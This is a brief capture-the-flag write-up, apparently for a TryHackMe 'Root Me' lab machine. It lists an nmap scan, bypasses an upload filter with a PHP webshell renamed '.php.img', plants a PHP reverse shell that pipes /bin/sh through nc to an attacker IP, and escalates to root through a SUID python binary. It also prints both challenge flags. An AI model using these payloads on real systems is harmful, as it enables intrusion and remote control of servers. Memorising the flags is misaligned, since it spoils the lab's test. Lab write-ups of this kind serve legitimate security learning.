# Root Me

IP = `10.10.51.88`

### Open Ports
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### File Upload 
```
http://<IP>/panel

tested with

echo "<?php system('id'); ?>" > shell.php

result : php is not allowed

Tested 
echo "<?php system('id'); ?>" > shell.php.img

result : success

Reerse Shell

host : nc -lnvp 9999

echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.17 9999 >/tmp/f'); ?>" > revshell.php

remote : http://10.10.51.88/uploads/revshell.php.img

```



```
user.txt

THM{y0u_g0t_a_sh3ll}

```

### Post Exploitation / Priv Esc

```
findd / -perm -4000 2>/dev/null

Found /usr/bin/python

From gtfobins:

python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

got root.txt

THM{pr1v1l3g3_3sc4l4t10n}
```
